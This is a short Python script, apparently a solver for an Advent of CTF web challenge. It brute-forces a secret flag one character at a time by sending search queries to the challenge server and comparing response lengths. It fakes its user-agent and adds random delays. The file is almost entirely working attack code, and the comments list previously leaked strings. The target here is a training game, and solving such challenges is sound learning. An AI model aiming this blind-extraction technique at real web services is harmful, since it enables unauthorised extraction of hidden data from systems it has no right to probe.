#! /usr/bin/env python3

import requests
import string
from time import sleep
from random import randrange

# leaked 
# TESTING: FLAG are such a good thing to find
# TESTING: Advent of code
# TESTING: Access code is 1234
# TESTING: The access code is 1234
# TESTING: KFC Recipe
# The 10 spices are in the diary on page 658
# 


FLG = 'Do yo'
ADDR = "https://06.adventofctf.com/"
r = requests.post(ADDR, data={"search": FLG}, headers={"User-agent": "Internet Explorer"})
if r.status_code != 200:
    raise ValueError("Returned not 200")

SZ = len(r.text)

while True:
    for l in  ' ' + string.ascii_lowercase + string.digits + '{}':
        sleep(randrange(1, 3))
        P = FLG + l
        print(f"TESTING: {P}")
        r = requests.post(ADDR, data={"search": P},  headers={"User-agent": "Internet Explorer"})
        if r.status_code != 200:
            raise ValueError("Returned not 200")

        if len(r.text) >= SZ:
            SZ = len(r.text)
            FLG += l
            break

    print(f"TEMP_FLAG: {FLG}")